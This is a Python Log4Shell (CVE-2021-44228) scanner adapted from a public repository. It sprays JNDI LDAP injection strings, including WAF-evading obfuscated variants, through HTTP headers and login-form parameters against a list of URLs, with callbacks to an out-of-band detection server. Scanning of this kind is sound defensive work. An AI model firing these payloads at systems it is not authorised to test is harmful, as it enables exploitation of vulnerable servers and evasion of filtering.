#!/usr/bin/env python3
#Note: downloaded from https://pythonrepo.com/repo/takito1812-log4j-detect-python-security
#
# I had to modify parts of the script due to possible bugs.
#
# To run, pass it two command line args - the urlFile (list of URLs) and the payload 
#
# Sample usage: 
#  	python log4j-detect.py urllist.txt log4shell.huntress.com:1389/3a821965-ae4e-4eaa-8376-50f95afc8dcf
#
# See log4shell.huntress.com for payload detection

import argparse, sys, requests, html, json, yaml, re
from itertools import permutations
from bs4 import BeautifulSoup
from urllib3 import disable_warnings
from requests_html import HTMLSession
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

transport_check_re = r"^http[s]?:\/\/(([a-zA-Z]|[a-zA-Z][a-zA-Z0-9\-]*[a-zA-Z0-9])\.)*([A-Za-z]|[A-Za-z][A-Za-z0-9\-]*[A-Za-z0-9]|(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5]))(?::\d{1,5})?$"

class customParser(argparse.ArgumentParser):
    def error(self, message):
        sys.stderr.write('error: %s\n' % message)
        self.print_help()
        sys.exit(2)

parser = customParser(prog='log4j-detect', description='Python 3 script to detect the Log4j Java library vulnerability (CVE-2021-44228)')
parser.add_argument('u', help='Single URL / File with a list of URLs')
parser.add_argument('s', help='Server from Burp Collaborator, interactsh or similar')
parser.add_argument('-t', '--threads', help='Number of threads', type=int, default=15)
parser.add_argument('-hr', '--huntress', help='Enable testing via Huntress Labs log4j tester', dest='huntress', action='store_true')
parser.add_argument('-hp', '--huntress-ldap', help='Huntress Labs log4j tester LDAP port', type=int, default=1389)
parser.add_argument('-i', '--http', help='Prepend http:// to the urls that don\'t have a transport in the file list instead of https://', dest='use_http', action='store_true')
parser.add_argument('-p', '--proxy', help='Send traffic through a proxy (by default, Burp)', nargs='?', default=None, const='http://127.0.0.1:8080')
parser.add_argument('-e', '--extractForms', help='Extract form tags from URLs', dest='extractForms', action='store_true')
args = parser.parse_args()

results = dict()

def get_huntress_uuid(host: str, urlId: str, url: str):
    huntress_uri = "https://{}/".format(host)
    try:
        resp = requests.get(huntress_uri)
        soup = BeautifulSoup(resp.text, 'html.parser')
        uuid = soup.find_all("code")[1].text # Get the second <code> tag which holds the UUID
        print('[{}] Found UUID ({}) for {}'.format(urlId, uuid, url))
        return uuid
    except Exception as e:
        print('[{}] Error getting UUID from Huntress server {}:'.format(urlId, args.s))
        print(e)
        return None

def get_payload_list(ldap_server: str):
    # Note: it is a mystery why the orginal author wanted to append the urlId and and environmental var to the payload.
    #       the script did not work until I got rid of that.
    #        payload1 = '${jndi:ldap://' + str(urlId) + '.${hostName}.' + args.s + '/a}'
    #        payload1 = '${jndi:ldap://'  + args.s + '/a}'
    payload1 = '${jndi:ldap://'  + ldap_server + '}'
# Note: next two payloads are to get around WAF filtering
    payload2 = '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://' + ldap_server + '}'
    payload3 = '${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://' + ldap_server + '}'
    payload4 = '${jndi:ldap://localhost#'  + ldap_server + '}'
    safe = "no-payload"
    payload_list = [payload1, payload2, payload3, payload4, safe]
    return payload_list
        
def get_test_id(urlId, perm_num):
    return "{}.{}".format(urlId, perm_num+1)

def add_transport(transport, re, url):
    if re.match(url) is None:
        return "{}://{}".format(transport, url)
    else:
        return url

def get_huntress_result(uuid, resId, url):
    try:
        json_uri = "https://{}/json/{}".format(args.s, uuid)
        vuln_result = requests.get(json_uri).json()
        results[url] = vuln_result
    except Exception as e:
        print('[r{}] Error getting Huntress results for UUID {}:'.format(resId, uuid))
        print(e)

def setup_payloads(urlId, url):
    try:
        if args.huntress:
            uuid = get_huntress_uuid(args.s, urlId, url)
            if uuid is None:
                return
        else:
            uuid = None
        
        if uuid is not None:
            ldap_server = "{}:{}/{}".format(args.s, args.huntress_ldap, uuid)
        else:
            ldap_server = args.s
        
        return (uuid, get_payload_list(ldap_server))
    except Exception as e:
        print('[{}] Error getting payload list {}:'.format(urlId, url))
        print(e)
        return (None, None)

def send_request(url, urlId, perm, post=False):
    try:
        params = {'UserName':perm[0], 'PassWord': "not-a-real-password" }
        headers = {'User-Agent':perm[2], 'Referer':perm[3], 'Authentication':perm[4]}
        post_get_headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
                            'Content-Type': 'application/x-www-form-urlencoded'}
        url_parts = url.split("/")
        if "index.jsp" in url_parts:
            post_parts = list(url_parts)
            post_parts.pop() #should be the last element
            post_parts.extend(["servlet", "WebAuthenticationServlet"])
            post_url = "/".join(post_parts)
        else:
            post_url = url
        adjusted_url = add_transport(transport, re, url)
        adjusted_post_url = add_transport(transport, re, post_url)
        #print('[{}] Trying... params: [{}], headers: [{}]'.format(get_test_id(urlId,i), params, headers))
        if post:
            with requests.Session() as s:
                r = s.get(adjusted_url, verify=False, proxies=proxies, timeout=10)
                print('[{}] {} ({})'.format(urlId, adjusted_url, r.status_code))
                r = s.post(adjusted_post_url, headers=post_get_headers, data=params, verify=False, proxies=proxies, timeout=10)
                print('[{}] {} ({})'.format(urlId, adjusted_post_url, r.status_code))
        else:
            r = requests.get(adjusted_url, headers=headers, params=params, verify=False, proxies=proxies, timeout=10)
        print('[{}] {} ({})'.format(urlId, adjusted_url, r.status_code))
        
    except Exception as e:
        print('[{}] Error while testing {}:'.format(urlId, url))
        print(e)
        pass

def get_all_forms(url):
    """ Returns all form tags found on a web url """
    # GET request
    res = session.get(url)
#    uncomment this next line for a javascript driven website
#    res.html.render()
    soup = BeautifulSoup(res.html.html, "html.parser")
    return soup.find_all("form")

def get_form_details(form):
    """Returns the HTML details of a form,
    including action, method and list of form controls (inputs, etc)"""
    details = {}
    # get the form action (requested URL)
    action = form.attrs.get("action").lower()
    # get the form method (POST, GET, DELETE, etc)
    # if not specified, GET is the default in HTML
    method = form.attrs.get("method", "get").lower()
    # get all form inputs
    inputs = []
    for input_tag in form.find_all("input"):
        # get type of input form control
        input_type = input_tag.attrs.get("type", "text")
        # get name attribute
        input_name = input_tag.attrs.get("name")
        # get the default value of that input tag
        input_value =input_tag.attrs.get("value", "")
        # add everything to that list
        inputs.append({"type": input_type, "name": input_name, "value": input_value})
    # put everything to the resulting dictionary
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

disable_warnings()
if args.proxy is None:
    proxies = {}
else:
    proxies = {'http':args.proxy, 'https':args.proxy}
if args.use_http:
    transport = "http"
else:
    transport = "https"

re = re.compile(transport_check_re)

try:
    with open(args.u) as urlFile:
        urlList = (line.strip() for line in urlFile)
        urlList = list(line for line in urlList if line)
        urlList = list(dict.fromkeys(urlList))
        urlLength = len(urlList)
        if urlLength > 1:
            print('[!] {} URLs loaded'.format(urlLength))
except:
    urlList = [args.u]
uuid_list = []

if args.extractForms:
    session = HTMLSession()
    for i, myurl in enumerate(urlList, start=1):
# get all form tags
        forms = get_all_forms(myurl)
# iterate over forms
        for i, form in enumerate(forms, start=1):
           form_details = get_form_details(form)
           print(form_details)

# Note: next task is to send inputs to the form; this code may work (commented out for now)
# TODO - test this out on a real website; replace user input for form field value with the payload
#data = {}

#for input_tag in form_details["inputs"]:
#    if input_tag["type"] == "hidden":
#        # if it's hidden, use the default value
#        data[input_tag["name"]] = input_tag["value"]
#    elif input_tag["type"] != "submit":
#        # all others except submit, prompt the user to set it
#        value = input(f"Enter the value of the field '{input_tag['name']}' (type: {input_tag['type']}): ")
#        data[input_tag["name"]] = value

## uncomment this line to stop test from running - debug mode 
#sys.exit(0)


with ThreadPoolExecutor(max_workers=args.threads) as executor:
    for urlId, url in enumerate(urlList, start=1):
        uuid, payloads = setup_payloads(urlId, url)
        if uuid is not None:
            uuid_list.append((uuid, url))
        for (i, perm) in enumerate(permutations(payloads)):
            executor.submit(send_request, url, get_test_id(urlId,i), perm, post=False)
            executor.submit(send_request, url, get_test_id(urlId,i), perm, post=True)

if args.huntress:
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        for resId, (uuid, url) in enumerate(uuid_list, start=1):
            executor.submit(get_huntress_result, uuid, resId, url)
            
if args.huntress:
    results_filename = "log4j_scan_results_{}.yaml".format(datetime.now().isoformat())
    if results:
        with open(results_filename, 'w') as outfile:
            yaml.dump(results, outfile, default_flow_style=False)
